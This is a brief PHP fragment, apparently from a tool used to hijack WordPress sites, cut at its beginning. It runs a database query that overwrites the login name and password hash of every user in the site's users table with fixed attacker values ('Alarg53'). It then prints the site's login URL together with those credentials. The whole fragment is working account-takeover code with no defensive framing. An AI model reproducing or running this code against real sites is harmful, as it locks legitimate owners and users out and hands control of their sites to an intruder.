...
#####
$query2 = mysqli_query($connect,"update ".$prefix."users set user_login='Alarg53',user_pass='7aba2a2680785c630620d7c3f9cca8f7'");
if($query2){
	echo "'$site_url/wp-login.php#Alarg53@Alarg53<br>";
}
}
}
}
